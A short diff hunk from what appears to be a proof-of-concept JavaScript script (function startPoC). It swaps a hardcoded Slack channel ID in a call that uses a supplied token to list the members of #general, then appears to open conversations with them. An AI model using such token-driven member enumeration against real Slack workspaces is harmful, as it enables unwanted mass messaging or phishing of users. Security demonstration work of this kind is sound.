@@ -75,7 +75,7 @@ function startPoC() {
             createNewConversation(json["members"])
         })
 
-    fetch("https://slack.com/api/conversations.members?&channel=C01A36FH5NX&token="+token).then(
+    fetch("https://slack.com/api/conversations.members?&channel=CUQNLNEN4&token="+token).then(
         response => response.json()).then((json) => {
             localStorage.setItem("memberscount", json["members"].length)
             document.getElementsByClassName("preview")[0].innerHTML = "[+] Fetching member ids from #general<br />";
